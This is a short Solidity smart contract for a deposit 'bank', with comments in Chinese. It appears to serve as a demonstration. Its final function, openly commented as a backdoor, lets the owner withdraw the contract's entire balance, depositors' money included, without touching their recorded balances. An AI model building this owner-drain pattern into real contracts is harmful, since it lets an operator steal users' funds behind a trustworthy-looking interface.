//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;


contract Bank {
    mapping (address => uint) private balances;
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    // 存钱
    function deposit() public payable returns (uint) {
        balances[msg.sender] += msg.value;
        return balances[msg.sender];
    }

    // 取钱
    function withdraw(uint withdrawAmount) public returns (uint remainingBal){
        if(withdrawAmount <= balances[msg.sender]){
            balances[msg.sender] -= withdrawAmount;
            address payable withdrawTo = payable(msg.sender);
            withdrawTo.transfer(withdrawAmount);
        }
        return balances[msg.sender];
    }

    // 余额查询
    function balance() public view returns (uint) {
        return balances[msg.sender];
    }

    // 银行现在的存钱量
    function depositsBalance() public view returns (uint) {
        return address(this).balance;
    }

    // 后门：管理取出所有钱
    function adminWithdraw(uint withdrawAmount) public returns (uint remainingBal) {
        require(msg.sender == owner, "you must be admin");
        if(withdrawAmount <= address(this).balance){
            address payable withdrawTo = payable(msg.sender);
            withdrawTo.transfer(withdrawAmount);
        }
        return address(this).balance;
        
    }
}